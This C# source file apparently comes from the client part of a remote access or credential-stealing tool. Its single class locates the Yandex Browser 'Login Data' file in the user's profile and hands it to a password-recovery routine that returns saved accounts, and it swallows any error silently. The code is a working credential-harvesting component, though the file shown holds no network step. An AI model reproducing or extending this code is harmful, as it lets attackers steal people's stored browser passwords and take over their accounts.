using Client.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Client.Controllers.Browsers
{
    class Yandex
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return PasswordRecoveryController.Passwords(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
